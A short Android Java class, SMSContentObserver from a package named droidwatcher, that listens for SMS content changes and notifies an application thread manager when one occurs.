package com.droidwatcher.services;

import android.database.ContentObserver;
import android.os.Handler;

public class SMSContentObserver extends ContentObserver {

	public SMSContentObserver(Handler handler) {
		super(handler);
		
	}

	@Override
	public void onChange(boolean selfChange) {
        super.onChange(selfChange);
        //Log.i("DEBUG", "SMS onCange");
        
        if (AppService.sThreadManager != null) {
        	AppService.sThreadManager.onSMSChange();
		}
	}
}
